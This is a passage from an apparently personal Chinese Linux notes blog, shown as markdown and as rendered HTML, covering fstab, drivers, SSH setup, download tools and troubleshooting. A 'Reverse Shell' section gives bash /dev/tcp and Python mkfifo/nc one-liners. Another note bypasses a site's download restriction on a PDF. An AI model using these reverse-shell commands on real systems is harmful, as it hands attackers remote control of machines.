xx.xx.xx.表示xx.xx.xx.00/24子网)\n\n  格式如下（其实不是非常确定以下是有用的）\n\n  ```shell\n  sshd:218.65.30.43:deny\n  sshd:58.*.*.*:deny\n  ```\n\n### 是否没有listen的socket就无法被入侵？\n\n### wget使用\n\n- `-r`递归下载\n- `-k`把下载下来的连接修改为本地地址\n- ` -e robots=off`不respect`robots.txt`\n- 或者是 set the `robots` variable to ‘off’ in your .wgetrc. \n- `--user-agent=\"\"`不添加user-agent头，如果不加上这个，有些网站会返回404\n\n### curl的使用\n\n- curl可以模拟post/get等行为，但是似乎没法递归下载\n\n### axel的使用\n\n- `-n 100`开100个线程\n- 好像还可以调整缓存，从而减少写入磁盘的次数\n\n### VirtualBox报错“kernel dirver not installed”\n\n- 复现：编译4.17内核（非稳定版，仓库也没有linux-header-4.17）并安装，安装过程中就报了一个有关virtualbox的错。后面跑这个内核时，virtualbox就提示“kernel driver not installed”，要求重新安装` virtualbox-dkms`，并运行`modprobe vboxdrv`\n- 在4.17内核尝试\n   ```shell\n   sudo apt update\n   sudo apt install virtualbox-dkms\n   sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms\n   sudo apt install --reinstall linux-headers-$(uname -r) virtualbox-dkms dkms\n   ...\n   ```\n   都没有解决问题，更严重的，linux-header-4.17也没有\n- 切换到4.15内核没有解决问题。尝试了以上命令无果\n- 删除4.17内核（直接在`/boot/`运行`rm *4.17* -r`）后`update-grub`。然后重启到`4.15.0-23-generic`并执行\n   ```shell\n   sudo apt update\n   sudo apt install --fix-missing\n   sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms \n   sudo modprobe vboxdrv\n   ```\n   解决问题\n- 题外话：删除内核时，`dpkg --get-selections | grep linux` 没有看到4.17相关的\n\n### 删除内核\n\n- `sudo apt-get remove linux-headers-4.4.0-22`\n- 在`/boot/`目录下删除相关的东西\n\n### chmod\n\n- `chmod -R 666 test`(test is a directory)会导致文件夹里的东西不可读（ls、cd该文件夹都不行）\n- 给文件夹本身加上x——`chmod 777 test`就可以了——文件夹内的东西不需要有可执行权限，但是文件夹的权限要有`x`标志\n\n### 内核模块加载\n\n- `modprobe tcp_bbr`加载`tcp_bbr`模块 \n- 比如，`echo \"tcp_bbr\">> /etc/modules-load.d/modules.conf `即可实现启动自动加载该模块\n\n### ufw\n\n- 如果有一条规则允许任意from ip 连本机的某个端口，协议是udp，然后还有另一条规则是只允许某ip K连本机的任意端口，协议是tcp，那么用ip 为K的机子去连是连不上udp的，似乎是因为规则的强弱导致的覆盖\n\n### 安装centos.md\n\n#### 联网\n\n- [参考资料](http://icyleaf.com/2013/09/network-configuration-in-centos/)\n\n- 修改`/etc/sysconfig/network-scripts/ifcfg-eth0 (此处为网卡名对应的文件，比入enps0是ifcfg-enps0)`\n\n- 改为\n\n  ```\n    DEVICE=eth0\n    HWADDR=\"00:22:19:09:4D:3C\"\n    NM_CONTROLLED=yes\n    ONBOOT=yes      # 默认是 no，我们要改成 yes\n    BOOTPROTO=dhcp  # 如果不是这个值也要修改\n\n  ```\n\n- 重启network service\n\n  - 方法一：`service network restart`\n  - 方法二：`/etc/init.d/network restart`\n\n- vbox似乎默认有开nat，所以以上即可，qemu好像要自己配置nat\n\n#### 安装图形界面\n\n- [安装图形界面](https://www.quora.com/How-can-I-install-X-Windows-on-CentOS-7)\n  - `yum groupinstall \"X Window System\"`\n  - `yum install gnome-classic-session gnome-terminal nautilus-open-terminal control-center liberation-mono-fonts`\n  - `unlink /etc/systemd/system/default.target`\n  - `ln -sf /lib/systemd/system/graphical.target  /etc/systemd/system/default.target`\n\n### 使用fstab自动挂载\n\n#### Deepin\n\n- 以下是`/etc/fstab`的内容\n\n- 在`Linux hzx-PC 4.9.0-deepin13-amd64 #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) x86_64 GNU/Linux`正确工作\n\n- 代码\n\n  ```fstab\n  # /dev/sda7\n  UUID=1faa19b8-abfb-44db-b186-5a368498d42b\t/         \text4      \trw,relatime,data=ordered\t0 1\n\n  # /dev/sda1\n  UUID=CCCB-BF68      \t/boot/efi \tvfat      \trw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro\t0 2\n\n  # /dev/sda4\n  UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3\tnone      \tswap      \tdefaults  \t0 0\n\n  # /dev/sda5\n  # UUID=0CADCC32742391F2       /home/hzx/sda5  \t    ntfs defaults\t0 1\n  UUID=0CADCC32742391F2   /mnt/data  ntfs defaults  1   2\n\n  # /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2\n  # /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2\n\n  # /dev/sda6\n  # UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults\t0 1\n  UUID=2A3C344750F6F698   /mnt/software  ntfs defaults 1   2\n\n  # /dev/sda3\n  # UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults\t0 1\n  UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa\t/mnt/deepin-sda3 ext4  defaults  1   2\n\n  ```\n\n- 然而并没有一直正常，后来修改了一次挂载点后，就一直崩，无论是把`defaults`换成`nofail`还是相反，都没用\n\n- 后来多启动几次就好了，，可能是类似多进程执行顺序之类的东西导致的不确定性错误\n\n#### Ubuntu\n\n- 一切正常\n\n- 代码\n\n  ```\n  # /etc/fstab: static file system information.\n  #\n  # Use 'blkid' to print the universally unique identifier for a\n  # device; this may be used with UUID= as a more robust way to name devices\n  # that works even if disks are added and removed. See fstab(5).\n  #\n  # <file system> <mount point>   <type>  <options>       <dump>  <pass>\n  # / was on /dev/sda8 during installation\n  UUID=3ae3faef-8fe6-42ef-8874-a0417df43831 /               ext4    errors=remount-ro 0       1\n  # /boot/efi was on /dev/sda1 during installation\n  UUID=CCCB-BF68  /boot/efi       vfat    umask=0077      0       1\n  # swap was on /dev/sda4 during installation\n  UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none            swap    sw              0       0\n  # /dev/sda5\n  # UUID=0CADCC32742391F2       /home/hzx/sda5  \t    ntfs defaults\t0 1\n  UUID=0CADCC32742391F2   /media/hzx/0CADCC32742391F2  ntfs nofail  1   2\n  # /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2\n  # /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2\n\n  # /dev/sda6\n  # UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults\t0 1\n  UUID=2A3C344750F6F698   /media/hzx/2A3C344750F6F698  ntfs nofail  1   2\n\n  # /dev/sda9\n  UUID=202D1B334927E0CC /media/hzx/202D1B334927E0CC ntfs nofail 1 2\n\n  # /dev/sda3\n  # UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults\t0 1\n  UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa\t/media/hzx/9bb0bb13-a28a-48a4-8022-6e83dcec47aa ext4 nofail     1   2\n  ```\n\n### mkfs.vfat了sda2那个efi分区结果deepin启动不了\n\n- 情况是这样的：往sda2装grub后总是失败，然后deepin自己的boot分区虽然也有grub，也有grub.cfg但是也一直必须手动引导。然后把sda2格式化后不知道为什么deepin无法启动。\n- 放弃，新装一个deepin 15.6，然后就会自动安装引导。\n- 搞定后，进原来那个deepin15.5还是失败，查看`journalctl -xb`，发现有个设备无法加载还是怎样的，然后想到以前该fstab也这样，所以比对错误信息和fstab，果然如此。\n- 原因是swap分区的uuid改了，并且也从sda4变成sda5，然而并没有去新建分区什么的，只有格式化sda2。\n- 后来猜测之所以装不上grub可能是sda2太小，只有100M，deepin提示说至少要300M\n\n### 编译内核.md\n\n#### 无openssl/bio.h\n\n> 编译Linux-4.9.11内核时遇到：“error : openssl/bio.h :No such file or folder”\n>\n>  \" #include <openssl/bio.h>\"\n>\n> <<<------------------------------------>>>\n>\n> 解决方法: [ubuntu 16.10,64位主机]\n>\n> `sudo apt install libssl-dev`\n\n### 记一次尝试下载 不允许下载的sinacloud的pdf\n\n- 获得页面源代码\n\n- 在html搜索字符串next从而定位到逻辑代码\n\n- 然后看到后面一堆JavaScript:void(0)，发现前面有个函数，但是页面内一堆引用外部的js脚本\n\n- 然后去chrome控制台使用以下代码\n\n  ```javascript\n  setTimeout(function() {\n      var script = document.createElement('script');\n      script.type = 'text/javascript';\n      script.innerHTML = \"console.log(closePay)\"//括号内是要获得的函数名称;\n      document.head.appendChild(script);\n  }, 1000);\n  ```\n\n- 然后等chrome显示出来后，点击显示出来的东西可以跳转到source code那里。从而最终定位到该函数所在的脚本，但是苦于代码过度，审计失败\n\n- 直接wget那些url得到的是206，但是wget一直停不下来，尝试用axel开20个线程下载，但是每次下来的都是13.9m大小的东西，然后还打不开（除了其中一页图片）\n\n- 查看chrome控制台的network模块，发现图片都没那么大，所以尝试右键copy request head发现并没有特别的，所以不知道为什么wget和axel没成功，copy curl后发现似乎是一个curl命令，加上-o参数后成功下载，curl即使不加上请求头，也可以正常获得东西，nice\n\n#### 附录\n\n```http\n//request head\nhttp://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&KID=sina%2CSAE0000000W1W2NYLKW2&ssig=K74aTt3a0F&range=6020439-6389345\nGET /swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&KID=sina%2CSAE0000000W1W2NYLKW2&ssig=K74aTt3a0F&range=6020439-6389345 HTTP/1.1\nHost: sinacloud.net\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\nDNT: 1\nAccept-Encoding: gzip, deflate\nAccept-Language: en,zh;q=0.9,zh-CN;q=0.8\n\n//从chrome复制的curl命令\ncurl 'http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&KID=sina%2CSAE0000000W1W2NYLKW2&ssig=K74aTt3a0F&range=3259947-3560373' -H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8' -H 'Connection: keep-alive' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en,zh;q=0.9,zh-CN;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36' --compressed\n```\n\n### 查找并删除特定文件.md\n\n[来源](https://www.cnblogs.com/langzou/p/5959940.html)\nlinux命令每日一练\nlinux中find与rm实现查找并删除目录或文件\n\nlinux 下用find命令查找文件，rm命令删除文件。\n\n删除指定目录下指定文件\nfind 要查找的目录名 -name .svn |xargs rm -rf\n\n删除指定名称的文件或文件夹: find -type d | grep .svn$ | xargs rm -r\n\n分析：\nfind -type d | grep .svn$ 通过此命令查找文件夹 过滤正则表达式中的目录\n| xargs rm -r 执行删除指令\n\n删除目录下所有exe文件\n\nfind . -name '*.exe' -type f -print -exec rm -rf {} ;\n\n(1) \".\" 表示从当前目录开始递归查找\n\n(2) “ -name '*.exe' \"根据名称来查找，要查找所有以.exe结尾的文件夹或者文件\n\n(3) \" -type f \"查找的类型为文件\n\n(4) \"-print\" 输出查找的文件目录名\n\n(5) 最主要的是是-exec了，-exec选项后边跟着一个所要执行的命令，表示将find出来的文件或目录执行该命令。\nexec选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个，最后是一个分号\n\n### VPS上部署hexo\n\n- [参考文章](https://blog.fundebug.com/2017/05/18/deploy-hexo-on-cloud/)\n\n- 遇到nginx 403，然后就关闭selinux\n\n  > 1、临时关闭\n  > setenforce 0 #设置SELinux 成为permissive模式\n  >\n  > ##### setenforce 1 设置SELinux 成为enforcing模式\n  >\n  > 2、修改配置文件需要重启机器：\n  >\n  > 修改/etc/selinux/config 文件\n  >\n  > 将SELINUX=enforcing改为SELINUX=disabled\n  >\n  > 重启机器即可\n\n### 搭建ss服务器\n\n- vps开了进程\n- 本地主机也如此\n- 但是提示[Errno 113] No route to host\n- 实在搞不明白——22端口可以用scp发文件过去vps\n- 所以用py写了个tcpclient、tcpserver，然后一运行也如此提示\n- 所以在vps运行`service firewalld stop`\n- 其他关闭服务器防火墙的方法都不起作用，不知道问什么\n\n### VLC字幕\n\n[链接](http://blog.sina.com.cn/s/blog_47ecc3660100vtnc.html)\n\n### vbox的win7虚拟机无法使用usb\n\n- [引用自](https://blog.csdn.net/harry_helei/article/details/46972125)\n- 安装Virtualbox Extension Pack\n- 用户权限添加\n  - 添加usbfs 用户组（virtualbox 装完成后会有 vboxusers 和vboxsf ）`sudo groupadd usbfs`   \n  - 将你的linux常用用户添加到vboxusers、usbfs这个两个组中`sudo adduser kuein vboxusers`  `sudo adduser kuein usbfs` \n  - 重启电脑，启动Virtualbox，确认在virtualbox管理器中，USB设备的enable usb controler 、enable usb2.0 controler打勾。Win7启动后，右击右下角USB设备符号，在Setting中，选择USB Massage相关的选项，就会自动安装驱动，驱动安装成功后，win7下成功挂载U盘。\n\n### Gnome-configure.md\n\n### hide title bar\n\n[no-title-bar-extention](https://extensions.gnome.org/extension/1267/no-title-bar/)\n\n### SSH.md\n\n#### 生成秘钥\n\n- 本地用`ssh-keygen`生成一个秘钥——可以自定义储存的文件名\n- 把`id_rsa.pub`传送到vps上，`cat id_rsa.pug > ~/.ssh/authorized_keys`，注意，这个命令会覆盖原有的`authorized_keys`内容\n\n#### 本地配置VPS别名\n\n- 代码\n\n  ```shell\n  cat >> ~/.ssh/config <<EOF\n  Host VultrVPS\n      User root\n      Hostname 217.163.11.0\n      PreferredAuthentications publickey\n      IdentityFile ~/.ssh/VultrVPS_rsa\n      Port 22\n  EOF\n  ```\n\n- 以上可实现使用秘钥 ，多个VPS可以依次增加配置\n\n### Linux安装.md\n\n#### 硬盘安装deepin\n\n- [来源](http://bbs.iaixue.com/forum.php?mod=viewthread&tid=1812)\n\n> 将如下grub菜单放到/boot/grub/grub.cfg的menuentry菜单处/deepin-15.5-amd64.iso是deepin的镜像文件完整路径，可以自由地放在linux或windows分区中，区分大小写\n\n```\nmenuentry \"UEFI Deepin 15.4 Linux ISO live\" --class deepin --class gnu-linux --class gnu --class os{\n        echo 'booting...'\n        set isofile=/deepin-15.5-amd64.iso\n        search --file $isofile --set=root\n        loopback loop $isofile\n        linux (loop)/live/vmlinuz.efi findiso=$isofile noprompt quiet boot=live ro deepin-installer locales=zh_CN.UTF-8 keyboard-configuration/layoutcode=us keyboard-configuration/variantcode= --  rootflags=sync\n        initrd (loop)/live/initrd.lz\n}\n```\n\n#### 刻录U盘安装Fedora或Centos\n\n- win下使用PowerISO刻录\n- 使用简单的dd命令`dd if=xxx of=xxx bs=xx`失败\n- 使用Ultraiso失败\n\n#### U盘grub引导多个linux镜像安装\n\n- [U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式](https://my.oschina.net/abcfy2/blog/491140)。文中提供的deepin的那个grub配置无效\n- [使用grub2制作启动U盘](https://bbs.deepin.org/forum.php?mod=viewthread&tid=150783)，尝试把grub配置换为该链接的配置，可以启动到deepin进行安装，但是中途说挂载某分区失败从而安装失败\n  ![错误信息](./LinuxInstall_1.jpg)\n\n### OSC提供的代码make不过\n\n```makefile\nsource code 9th/final-src-osc9e/ch2 \n➜ make                                                             \nmake -C /lib/modules/4.9.0-deepin13-amd64/build M=/home/hzx/Program/source code 9th/final-src-osc9e/ch2 modules\nmake[1]: Entering directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'\narch/x86/Makefile:140: CONFIG_X86_X32 enabled but no binutils support\nmake[3]: *** No rule to make target 'code'.  Stop.\nMakefile:150: recipe for target 'sub-make' failed\nmake[2]: *** [sub-make] Error 2\nMakefile:8: recipe for target 'all' failed\nmake[1]: *** [all] Error 2\nmake[1]: Leaving directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'\nMakefile:3: recipe for target 'all' failed\nmake: *** [all] Error 2\n```\n\n解决方法，把source code 9th这个文件名的空格去掉\n\n### vim dos unix\n\n- 如果某文本文件的行末都有0d0a，则vim直接打开识别为dos。如果是vim -b 打开，识别为unix。如果最后一行不是0d0a，其他行是，不识别为dos。\n\n### 删除文件名以`-`开头的文件\n\n- 比如删除`-a`：`rm -- -a`\n\n### 文件的change，modification时间\n\n- 以下来自于实验：change是修改属性，比如`touch -d 1111 filename`，modification是修改内容\n\n### ctags 注意事项\n\n- 如果某文件打开后编辑过，可能ctags打的tag就失效了（比如行号不对），所以跳转无效\n\n### watch命令\n\n- `watch -n 0.1 ./a.o` 与`watch ./a.o -n 0.1`的区别是前者`-n 0.1`是watch的参数，后者是`./a.o`的参数\n\n### 修复light display manger失败\n\n- 通过启动时的错误信息，还有single模式中，service lightdm start后的错误信息（systemctl service ）可以知道light display manager启动失败\n- 搜到的都说重新安装dde，但是需要网络，而single-user mode 是没有网络的。然后其他模式又没搜到要怎么进去，到是grub图形界面有提供一个带网络的recovery模式，不过我没有grub图形界面\n- 就搜了搜在single模式联网——按照定义，single模式是没有网络的。然后联网后install dde，中途flatpak提示desktopRecord.service不存在，然后错误处理ctrl-c了dde的安装过程。然后后来按照dde的安装信息提示安装其他组件console-setup，然后使用sudo apt-get install --reinstall dde修复了dde的安装（apt -f在这里是没用的）\n- 不知道为什么中途提示proxychain 的配置文件修改了\n- 本来想着要是没网，就下个lightdm 来安装，结果没有binary的文件，装不了。\n- 后来安装好dde后startx老是说成功退出——没有任何报错信息，都是成功，连退出都是成功退出，但是就是不符合我的预期\n\n### 查看glibc版本\n\n- `ldd --version`\n- `getconf GNU_LIBC_VERSION`\n\n### shell使用`|`时的SIGPIPE\n\n- 比如`proc_1 | proc_2`，如果第二个进程关闭，第一个就会管道破裂，如果没有处理就会die\n\n### 安装nvidia驱动\n\n- 在nvidia官网下程序\n- `telinit 3`关掉`X server`（或者是systemctl stop lightdm.service）\n- 安装过程中需要编译内核模块，编译时使用的gcc版本要与编译内核的gcc版本一致\n   ```\n   $ cat /proc/version\n   Linux version 4.15.0-29deepin-generic (pbuilder@zs-PC) (gcc version 7.3.0 (Debian 7.3.0-19)) #31 SMP Fri Jul 27 07:12:08 UTC 2018\n   ```\n- 安装时，如果有驱动占用了gpu，那么会失败，在`/etc/modprobe.d/`加一个文件（命名为`*.conf`）\n   ```\n   blacklist nouveau\n   blacklist rivafb\n   blacklist rivatv\n   blacklist nvidiafb\n\n   # 下面这几条应该可以不用，我不加也成功\n   options nouveau modeset=0 \n   options rivafb modeset=0\n   options rivatv modeset=0\n   options nvidiafb modeset=0\n   ```\n- 安装过程中我一开始选使用dkms，但是失败，后来没选，也失败了几次，所以不清楚dkms的情况\n- 安装后要运行`nvidia-xconfig`配置`/etc/X11/xorg.conf`，或者自己手动配置（然而我这里一直失败，一加相关的东西就启动卡住，而且也没有报错信息——我们又看其他信息，不知道其他信息有没有提示）\n- 然而。事情没那么简单，我装了nvidia驱动后，deepin-wm cpu占用率飙升，nvidia-smi看不到使用gpu的进程，gg。没办法，卸了驱动，删了blacklist\n- 后来发现deepin有个gpu driver manager，运行后，跑了很久，重启后还跑了很久，还看到一堆error，然后还开一个渲染画面让我看看渲染得咋样，然后后来启动成功，nvidia-smi也看到有deepin-wm的进程跑在gpu上，deepin-wm的cpu占用率也没有飙升，还行\n\n### Tilix dont inherit the directory\n\n- [The VTE matter this](https://github.com/gnunn1/tilix/wiki/VTE-Configuration-Issue)\n\n### sogouPinyin候选框异常解决方法\n\n- 其实也不算解决，我在配置文件里把所有能关掉skin的选项都关了，sougou还是不使用fcitx的skin，删了`~/.config`下面的sogou相关配置文件也没用\n- 后来发现，如果有其他输入法一起，然后切换过其他输入法，sogoupinyin的皮肤就跟那个输入法的一样（也不知道是不是一样，我的fcitx不能切换皮肤，所有只有一个皮肤）\n\n### cache的详细信息（包括相联度，电压等）\n\n- `sudo dmidecode -t 7`\n- `getconf -a | grep CACHE`\n\n### 设置默认浏览器\n\n- `xdg-settings set default-web-browser chrome.desktop`\n- `xdg-settings get default-web-browser`获取值\n- 关于desktop文件的`Exec`段中的后缀，[doc](https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html)\n   > %i\tThe Icon key of the desktop entry expanded as two arguments, first --icon and then the value of the Icon key. Should not expand to any arguments if the Icon key is empty or missing.\n   > %c\tThe translated name of the application as listed in the appropriate Name key in the desktop entry.\n   > %k\tThe location of the desktop file as either a URI (if for example gotten from the vfolder system) or a local filename or empty if no location is known.\n   > %f\tA single file name (including the path), even if multiple files are selected. The system reading the desktop entry should recognize that the program in question cannot handle multiple file arguments, and it should should probably spawn and execute multiple copies of a program for each selected file if the program is not able to handle additional file arguments. If files are not on the local file system (i.e. are on HTTP or FTP locations), the files will be copied to the local file system and %f will be expanded to point at the temporary file. Used for programs that do not understand the URL syntax.\n   > %F\tA list of files. Use for apps that can open several local files at once. Each file is passed as a separate argument to the executable program.\n   > %u\tA single URL. Local files may either be passed as file: URLs or as file path.\n   > %U\tA list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path.\n\n### github账户有设置ssh但是仓库push还是要用户密码的解决方法\n\n- 这是因为remote add时使用的是https，而不是ssh\n- `git remote -v`可以看到是https链接\n- `git remote set-url origin git@github.com:USERNAME/REPOSITORY.git`改为ssh\n- [参考](https://help.github.com/articles/changing-a-remote-s-url/)\n","content":"<h3 id=\"Reverse-Shell\"><a href=\"#Reverse-Shell\" class=\"headerlink\" title=\"Reverse Shell\"></a>Reverse Shell</h3><ul>\n<li>受控机器上执行<code>bash -i /dev/tcp/IP/PORT 0&lt;&amp;1</code> (最后改为<code>0&gt;&amp;1</code>也ok)，入侵者机器提前打开listen socket，可以实现reverse shell</li>\n<li><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc localhost 8000 &gt; /tmp/f&#39;)&quot;)</code>（python代码）也可以</li>\n</ul>\n<h3 id=\"SIGINT的SIG-DEF\"><a href=\"#SIGINT的SIG-DEF\" class=\"headerlink\" title=\"SIGINT的SIG_DEF\"></a>SIGINT的SIG_DEF</h3><ul>\n<li>默认的handler会输出一个换行。</li>\n<li><p>代码</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    sleep(<span class=\"number\">10</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果不<code>kill -2 a.out</code>则不会输出一个空行，如果kill则会</p>\n</li>\n</ul>\n<h3 id=\"boot过程\"><a href=\"#boot过程\" class=\"headerlink\" title=\"boot过程\"></a>boot过程</h3><ul>\n<li>究竟是否有使用 /dev/sda 第一个sector，还是说uefi中我选择deepin 的boot loader那么直接就去sda12读取第一个sector</li>\n<li>我在grub命令行环境可以很好的读取各个分区的东西，那么为什么还需要<code>initrd    /boot/initrd.img-4.9.0-deepin13-amd64</code>。（我甚至可以在这条命令前去加载一个ntfs的module）。</li>\n<li>既然boot loader 可以加载<code>/boot/</code>目录中的vmlinuz、initrd，那么为什么还需要kernel 加载sata驱动来加载文件呢</li>\n<li>关于initrd <blockquote>\n<p>The special file /dev/initrd is a read-only block device. This device is a RAM disk that is initialized (e.g., loaded) by the boot loader before the kernel is started. The kernel then can use /dev/initrd’s contents for a two-phase system boot-up. In the first boot-up phase, the kernel starts up and mounts an initial root filesystem from the contents of /dev/initrd (e.g., RAM disk initialized by the boot loader). In the second phase, additional drivers or other modules are loaded from the initial root device’s contents. After loading the additional modules, a new root filesystem (i.e., the normal root filesystem) is mounted from a different device.<br>Boot-up operation<br>   When booting up with initrd, the system boots as follows:</p>\n<ol>\n<li>The boot loader loads the kernel program and /dev/initrd’s contents into memory.</li>\n<li>On kernel startup, the kernel uncompresses and copies the contents of the device /dev/initrd onto device /dev/ram0 and then frees the memory used<br>by /dev/initrd.</li>\n<li>The kernel then read-write mounts the device /dev/ram0 as the initial root filesystem.</li>\n<li>If  the  indicated  normal  root  filesystem is also the initial root filesystem (e.g., /dev/ram0) then the kernel skips to the last step for the<br>usual boot sequence.</li>\n<li>If the executable file /linuxrc is present in the initial root filesystem, /linuxrc is executed with UID 0.  (The file /linuxrc  must  have  exe‐<br>cutable permission.  The file /linuxrc can be any valid executable, including a shell script.)</li>\n<li>If  /linuxrc is not executed or when /linuxrc terminates, the normal root filesystem is mounted.  (If /linuxrc exits with any filesystems mounted<br>on the initial root filesystem, then the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li>\n<li>If the normal root filesystem has a directory /initrd, the device /dev/ram0 is moved from / to /initrd.  Otherwise, if the directory /initrd does<br>not  exist, the device /dev/ram0 is unmounted.  (When moved from / to /initrd, /dev/ram0 is not unmounted and therefore processes can remain run‐<br>ning from /dev/ram0.  If directory /initrd does not exist on the normal root filesystem and any processes  remain  running  from  /dev/ram0  when<br>/linuxrc exits, the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li>\n<li>The usual boot sequence (e.g., invocation of /sbin/init) is performed on the normal root filesystem.</li>\n</ol>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"tab补全失效\"><a href=\"#tab补全失效\" class=\"headerlink\" title=\"tab补全失效\"></a>tab补全失效</h3><ul>\n<li>when press tab to 补全, there is   bash: 无法为立即文档创建临时文件: 权限不够</li>\n<li>this is because of the /dev/sda9 is mounted on /tmp, umonut it repair this error</li>\n</ul>\n<h3 id=\"登录用户管理\"><a href=\"#登录用户管理\" class=\"headerlink\" title=\"登录用户管理\"></a>登录用户管理</h3><ul>\n<li><p><code>users</code>或 <code>w</code>查看当前登录的用户</p>\n</li>\n<li><p><code>lsof -iTCP</code> <code>netstat -tunp</code>查看当前的网络连接</p>\n</li>\n<li><p>查看打开的端口</p>\n</li>\n<li><p><code>pkill -kill -t pts/1</code> 踢掉pts/1</p>\n</li>\n<li><p>编辑<code>/etc/hosts.deny</code> ，deny掉ip或ip段，保存立即生效？(至今仍然不知道是否有效，以及不知道通配符要怎么写，好像是 xx.xx.xx.表示xx.xx.xx.00/24子网)</p>\n<p>格式如下（其实不是非常确定以下是有用的）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sshd:218.65.30.43:deny</span><br><span class=\"line\">sshd:58.*.*.*:deny</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"是否没有listen的socket就无法被入侵？\"><a href=\"#是否没有listen的socket就无法被入侵？\" class=\"headerlink\" title=\"是否没有listen的socket就无法被入侵？\"></a>是否没有listen的socket就无法被入侵？</h3><h3 id=\"wget使用\"><a href=\"#wget使用\" class=\"headerlink\" title=\"wget使用\"></a>wget使用</h3><ul>\n<li><code>-r</code>递归下载</li>\n<li><code>-k</code>把下载下来的连接修改为本地地址</li>\n<li><code>-e robots=off</code>不respect<code>robots.txt</code></li>\n<li>或者是 set the <code>robots</code> variable to ‘off’ in your .wgetrc. </li>\n<li><code>--user-agent=&quot;&quot;</code>不添加user-agent头，如果不加上这个，有些网站会返回404</li>\n</ul>\n<h3 id=\"curl的使用\"><a href=\"#curl的使用\" class=\"headerlink\" title=\"curl的使用\"></a>curl的使用</h3><ul>\n<li>curl可以模拟post/get等行为，但是似乎没法递归下载</li>\n</ul>\n<h3 id=\"axel的使用\"><a href=\"#axel的使用\" class=\"headerlink\" title=\"axel的使用\"></a>axel的使用</h3><ul>\n<li><code>-n 100</code>开100个线程</li>\n<li>好像还可以调整缓存，从而减少写入磁盘的次数</li>\n</ul>\n<h3 id=\"VirtualBox报错“kernel-dirver-not-installed”\"><a href=\"#VirtualBox报错“kernel-dirver-not-installed”\" class=\"headerlink\" title=\"VirtualBox报错“kernel dirver not installed”\"></a>VirtualBox报错“kernel dirver not installed”</h3><ul>\n<li>复现：编译4.17内核（非稳定版，仓库也没有linux-header-4.17）并安装，安装过程中就报了一个有关virtualbox的错。后面跑这个内核时，virtualbox就提示“kernel driver not installed”，要求重新安装<code>virtualbox-dkms</code>，并运行<code>modprobe vboxdrv</code></li>\n<li><p>在4.17内核尝试</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install virtualbox-dkms</span><br><span class=\"line\">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms</span><br><span class=\"line\">sudo apt install --reinstall linux-headers-$(uname -r) virtualbox-dkms dkms</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p> 都没有解决问题，更严重的，linux-header-4.17也没有</p>\n</li>\n<li>切换到4.15内核没有解决问题。尝试了以上命令无果</li>\n<li><p>删除4.17内核（直接在<code>/boot/</code>运行<code>rm *4.17* -r</code>）后<code>update-grub</code>。然后重启到<code>4.15.0-23-generic</code>并执行</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span 